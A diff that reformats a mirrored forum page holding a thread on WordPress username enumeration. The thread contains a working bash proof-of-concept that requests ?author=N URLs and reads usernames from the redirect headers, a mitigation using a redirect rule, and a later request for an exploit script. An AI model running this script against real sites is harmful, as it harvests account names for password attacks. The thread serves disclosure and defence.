@@ -1,28 +1,25 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+<html dir="ltr" id="vbulletin_html" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/printthread.php?t=963&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:08:40 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=963&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:08:40 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
-<head>
-	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
-	<base  /><!--[if IE]></base><![endif]-->
-	<meta name="generator" content="vBulletin 4.2.1" />
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+	<base/><!--[if IE]></base><![endif]-->
+	<meta content="vBulletin 4.2.1" name="generator"/>
 
 	
-	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	<link href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" rel="stylesheet" type="text/css"/>
 	
 
 
 
 	<title> wordpress username enumeration PoC bash</title>
-	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+	<link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>
 
 </head>
 <body>
 
 <div class="above_body">
-<div id="header" class="floatcontainer">
-<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+<div class="floatcontainer" id="header">
+<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
 </div>
 </div>
 <div class="body_wrapper">
@@ -44,89 +41,89 @@
 		<div class="title">wordpress username enumeration PoC bash</div>
 	
 	<div class="content">
-		<blockquote class="restore">Hi All,<br />
-<br />
-We have recently seen WordPress User name enumeration Vulnerability disclosure here <a href="../external.html?link=http://seclists.org/fulldisclosure/2011/May/493" target="_blank">http://seclists.org/fulldisclosure/2011/May/493</a><br />
-<br />
-Versions Effected are : 2.6, 3.1, 3.1.1, 3.1.3<br />
-<br />
-Ohk so lets see what this vulnerability is all about.<br />
-<br />
-Wordpress by default allows a simple redirection <br />
-<br />
-<a href="../external.html?link=http://site_name/?author=1" target="_blank">http://site_name/?author=1</a><br />
-will redirect to <br />
-<a href="../external.html?link=http://site_name/author/user_name_author" target="_blank">http://site_name/author/user_name_author</a><br />
-and this redirection is a 301 redirect.<br />
-<br />
-now you get the user page either userpage or a list of user posts.<br />
-<br />
-so we can extract the username from two places.<br />
-1) title of html page -&gt; need whole html to be loaded.<br />
-2) redirect url. -&gt; quick and easy.<br />
-<br />
-Here i am enclosing a simple PoC which could be run on Bash Shell.<br />
-(Note : PoC on python is already available for those who are curious)<br />
-<br />
+		<blockquote class="restore">Hi All,<br/>
+<br/>
+We have recently seen WordPress User name enumeration Vulnerability disclosure here <a href="../external.html?link=http://seclists.org/fulldisclosure/2011/May/493" target="_blank">http://seclists.org/fulldisclosure/2011/May/493</a><br/>
+<br/>
+Versions Effected are : 2.6, 3.1, 3.1.1, 3.1.3<br/>
+<br/>
+Ohk so lets see what this vulnerability is all about.<br/>
+<br/>
+Wordpress by default allows a simple redirection <br/>
+<br/>
+<a href="../external.html?link=http://site_name/?author=1" target="_blank">http://site_name/?author=1</a><br/>
+will redirect to <br/>
+<a href="../external.html?link=http://site_name/author/user_name_author" target="_blank">http://site_name/author/user_name_author</a><br/>
+and this redirection is a 301 redirect.<br/>
+<br/>
+now you get the user page either userpage or a list of user posts.<br/>
+<br/>
+so we can extract the username from two places.<br/>
+1) title of html page -&gt; need whole html to be loaded.<br/>
+2) redirect url. -&gt; quick and easy.<br/>
+<br/>
+Here i am enclosing a simple PoC which could be run on Bash Shell.<br/>
+(Note : PoC on python is already available for those who are curious)<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code"><br />
-#!/bin/bash<br />
-# WordPress User Enumeration PoC by Anant Shrivastava<br />
-# Disclosure : http://seclists.org/fulldisclosure/2011/May/493<br />
-if [ $# -ne 1 ]<br />
-then<br />
-echo &quot;Wordpress username enumeration PoC&quot;<br />
-echo &quot;based on disclosure @ : http://seclists.org/fulldisclosure/2011/May/493 &quot;<br />
-echo $0 &quot;URL of Website&quot;<br />
-else<br />
-count=1<br />
-title=0<br />
-while [ $count -lt 10 ]<br />
-do<br />
-result=`curl -I -s --max-time 30 --max-filesize 1 $1?author=$count | grep -F 'Location:'`<br />
-name=`echo $result | rev | cut -f2 -d&quot;/&quot; | rev`<br />
-nm=`echo &quot;$&quot;$result`<br />
-if [ &quot;$nm&quot; != &quot;$&quot; ]<br />
-then<br />
-if [ $title == 0 ]<br />
-then<br />
-echo &quot;ID : UserName&quot;<br />
-title=1<br />
-fi<br />
-echo -n $count &quot; : &quot;<br />
-echo $name<br />
-fi<br />
-count=`expr $count + 1`<br />
-done<br />
-if [ $title == 0 ]<br />
-then<br />
-echo &quot;Either this site is not vulnerable or is not using wordpress hosted&quot;<br />
-fi<br />
-fi</code><hr />
-</div>Originally Posted : <a href="../external.html?link=http://blog.anantshri.info/wordpress-user-enumeration-poc-shell-script/" target="_blank">http://blog.anantshri.info/wordpress...-shell-script/</a><br />
-<br />
-after creating the PoC my own site was also susceptible to this attack and hence i was looking for a fix and found a old friend of mine to the rescue.<br />
-<br />
-So here is the way how you can patch it<br />
-<br />
-I am right now using a wordpress plugin : Redirections<br />
-<a href="../external.html?link=https://wordpress.org/extend/plugins/redirection/" target="_blank">https://wordpress.org/extend/plugins/redirection/</a><br />
-<br />
-Inside the plugin page which comes under : tools -&gt; redirections<br />
-<br />
-Add a new rule with following settings.<br />
-<br />
-<b>Source url : ^(.*)/?author=(.*)<br />
-target url : /<br />
-Reg Exp : Yes<br />
-Match : url only<br />
-Action : Redirect to url<br />
-</b><br />
-and Add Redirection<br />
-<br />
-all done� just try any url with ?author=no<br />
-<br />
+	<hr/><code class="bbcode_code"><br/>
+#!/bin/bash<br/>
+# WordPress User Enumeration PoC by Anant Shrivastava<br/>
+# Disclosure : http://seclists.org/fulldisclosure/2011/May/493<br/>
+if [ $# -ne 1 ]<br/>
+then<br/>
+echo "Wordpress username enumeration PoC"<br/>
+echo "based on disclosure @ : http://seclists.org/fulldisclosure/2011/May/493 "<br/>
+echo $0 "URL of Website"<br/>
+else<br/>
+count=1<br/>
+title=0<br/>
+while [ $count -lt 10 ]<br/>
+do<br/>
+result=`curl -I -s --max-time 30 --max-filesize 1 $1?author=$count | grep -F 'Location:'`<br/>
+name=`echo $result | rev | cut -f2 -d"/" | rev`<br/>
+nm=`echo "$"$result`<br/>
+if [ "$nm" != "$" ]<br/>
+then<br/>
+if [ $title == 0 ]<br/>
+then<br/>
+echo "ID : UserName"<br/>
+title=1<br/>
+fi<br/>
+echo -n $count " : "<br/>
+echo $name<br/>
+fi<br/>
+count=`expr $count + 1`<br/>
+done<br/>
+if [ $title == 0 ]<br/>
+then<br/>
+echo "Either this site is not vulnerable or is not using wordpress hosted"<br/>
+fi<br/>
+fi</code><hr/>
+</div>Originally Posted : <a href="../external.html?link=http://blog.anantshri.info/wordpress-user-enumeration-poc-shell-script/" target="_blank">http://blog.anantshri.info/wordpress...-shell-script/</a><br/>
+<br/>
+after creating the PoC my own site was also susceptible to this attack and hence i was looking for a fix and found a old friend of mine to the rescue.<br/>
+<br/>
+So here is the way how you can patch it<br/>
+<br/>
+I am right now using a wordpress plugin : Redirections<br/>
+<a href="../external.html?link=https://wordpress.org/extend/plugins/redirection/" target="_blank">https://wordpress.org/extend/plugins/redirection/</a><br/>
+<br/>
+Inside the plugin page which comes under : tools -&gt; redirections<br/>
+<br/>
+Add a new rule with following settings.<br/>
+<br/>
+<b>Source url : ^(.*)/?author=(.*)<br/>
+target url : /<br/>
+Reg Exp : Yes<br/>
+Match : url only<br/>
+Action : Redirect to url<br/>
+</b><br/>
+and Add Redirection<br/>
+<br/>
+all done… just try any url with ?author=no<br/>
+<br/>
 now this url will be redirected back to your main page effectively nullifying the effect of user name enumeration.</blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_2">
@@ -139,10 +136,10 @@ now this url will be redirected back to your main page effectively nullifying th
 		<div class="title">Bash for Wordpress redirect.</div>
 	
 	<div class="content">
-		<blockquote class="restore">Could you please tell me how to write a bash or python script to implement the wordpress 4.5.2 redirect bypass vulnerability. <br />
-   Link : <a href="../external.html?link=https://wpvulndb.com/vulnerabilities/8522" target="_blank">https://wpvulndb.com/vulnerabilities/8522</a><br />
-    <br />
-<br />
+		<blockquote class="restore">Could you please tell me how to write a bash or python script to implement the wordpress 4.5.2 redirect bypass vulnerability. <br/>
+   Link : <a href="../external.html?link=https://wpvulndb.com/vulnerabilities/8522" target="_blank">https://wpvulndb.com/vulnerabilities/8522</a><br/>
+    <br/>
+<br/>
   Thank You.</blockquote>
 	</div>
 </li>
@@ -151,14 +148,14 @@ now this url will be redirected back to your main page effectively nullifying th
 
 </div>
 <div class="below_body">
-<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:48 PM</span>.</div>
+<div class="footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">05:48 PM</span>.</div>
 
-<div id="footer_copyright" class="footer_copyright">
+<div class="footer_copyright" id="footer_copyright">
 	<!-- Do not remove this copyright notice -->
-	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
 	<!-- Do not remove this copyright notice -->	
 </div>
-<div id="footer_morecopyright" class="footer_morecopyright">
+<div class="footer_morecopyright" id="footer_morecopyright">
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
 	
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
@@ -176,7 +173,7 @@ try{
 var pageTracker = _gat._getTracker('UA-17311051-3');
 pageTracker._trackPageview();
 } catch(err) {}</script>
-</body>
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=963&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:08:40 GMT -->
-</html>
+
+
+</body><!-- Mirrored from garage4hackers.com/printthread.php?t=963&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:08:40 GMT --></html>
